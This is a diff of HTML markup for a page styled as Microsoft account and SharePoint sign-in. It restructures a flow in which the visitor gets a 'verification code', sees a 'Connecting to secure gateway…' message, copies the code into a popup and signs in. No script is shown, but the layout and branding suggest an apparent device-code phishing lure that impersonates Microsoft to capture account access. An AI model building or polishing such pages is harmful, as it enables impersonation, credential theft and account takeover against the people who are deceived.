@@ -175,17 +175,27 @@
             </div>
         </div>
 
-        <div id="verification-ui">
-            <label class="input-label">Your verification code</label>
-            <input type="text" id="code-box" class="code-input" readonly>
-            <button class="btn-secondary" onclick="copyAndOpenPopup()">Copy code</button>
-            <button class="btn-primary" onclick="verifyWithCopy()">Sign in with this code</button>
-            <button class="refresh-btn" id="refreshBtn" onclick="refreshCode()" style="display:none;">Get new code</button>
+        <button id="startBtn" class="btn-primary" onclick="generateCode()" data-primary-button>
+            Get verification code
+        </button>
+        
+        <div class="code-panel" id="codePanel" style="display:none">
+            <div class="code-label">Your verification code</div>
+            <div class="code-box">
+                <div class="code-value loading" id="codeValue">· · · · · ·</div>
+                <div class="code-hint" id="codeHint">Connecting to secure gateway…</div>
+            </div>
+            <div class="timer-row">
+                <div class="timer-pill" id="timerPill" style="display:none"></div>
+                <button class="refresh-btn" id="refreshBtn" onclick="refreshCode()" style="display:none">Get new code</button>
+            </div>
+            <div class="action-row" id="actionRow" style="display:none">
+                <button class="btn-secondary" id="copyBtn" onclick="copyAndOpenPopup()">Copy code</button>
+                <button class="btn-primary" id="verifyBtn" onclick="verifyWithCopy()">Sign in with this code</button>
+            </div>
             <div class="timer-text" id="timerText"></div>
             <div class="status-text" id="statusMsg"></div>
         </div>
-
-        <button id="startBtn" class="btn-primary" onclick="generateCode()">Get verification code</button>
         
         <div class="footer">
             Microsoft account · SharePoint · Security · Privacy
